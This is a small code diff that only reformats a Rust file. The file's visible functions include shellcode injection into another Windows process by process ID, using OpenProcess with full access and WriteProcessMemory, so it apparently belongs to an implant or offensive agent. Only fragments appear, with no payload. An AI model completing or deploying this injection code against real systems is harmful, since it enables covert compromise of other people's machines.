@@ -245,13 +245,7 @@ fn integrity_level() -> String {
 
         // First call: get required buffer size
         let mut size: u32 = 0;
-        let _ = GetTokenInformation(
-            token,
-            TokenIntegrityLevel,
-            None,
-            0,
-            &mut size,
-        );
+        let _ = GetTokenInformation(token, TokenIntegrityLevel, None, 0, &mut size);
         let mut buf = vec![0u8; size as usize];
 
         if GetTokenInformation(
@@ -311,8 +305,8 @@ fn inject_cmd(args: &str) -> String {
 
 #[cfg(target_os = "windows")]
 fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
-    use windows::{Win32::Foundation::*, Win32::System::Memory::*, Win32::System::Threading::*};
     use winapi::um::memoryapi::WriteProcessMemory;
+    use windows::{Win32::Foundation::*, Win32::System::Memory::*, Win32::System::Threading::*};
 
     unsafe {
         let proc = match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
